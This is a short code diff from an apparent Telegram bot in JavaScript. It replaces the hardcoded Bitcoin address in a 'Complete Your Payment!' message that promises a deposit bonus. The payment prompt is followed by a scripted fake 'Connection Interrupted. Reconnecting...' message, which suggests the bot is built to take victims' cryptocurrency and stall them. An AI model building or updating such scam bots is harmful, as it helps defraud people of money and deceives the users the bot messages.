@@ -443,7 +443,7 @@ bot.on("message", async (msg) => {
     const message =
       session.click != "currencies"
         ? `${session.name} Select the cryptocurrency you want for the deposit bonus.`
-        : "🚀 Complete Your Payment!🚀\n\nTo finalize your purchase, simply click on the BTC address to copy.\nAnd then paste it on the site where it asks for BTC address. ✅\n\n`bc1qz0fwwaagrcdxwpcent59gukrtspdmctg73ykr4`\n\n🪙 Make sure you use the correct address for the specific crypto you're purchasing.\n🚼 Your deposit will appear in your Transactions page after 1 confirmation is reached.";
+        : "🚀 Complete Your Payment!🚀\n\nTo finalize your purchase, simply click on the BTC address to copy.\nAnd then paste it on the site where it asks for BTC address. ✅\n\n`bc1q784c0kg0ktya66ysdwe70nedxm52k6yrsqsa99`\n\n🪙 Make sure you use the correct address for the specific crypto you're purchasing.\n🚼 Your deposit will appear in your Transactions page after 1 confirmation is reached.";
 
     setTimeout(() => {
       bot.sendMessage(userId, "Connection Interrupted. Reconnecting...");
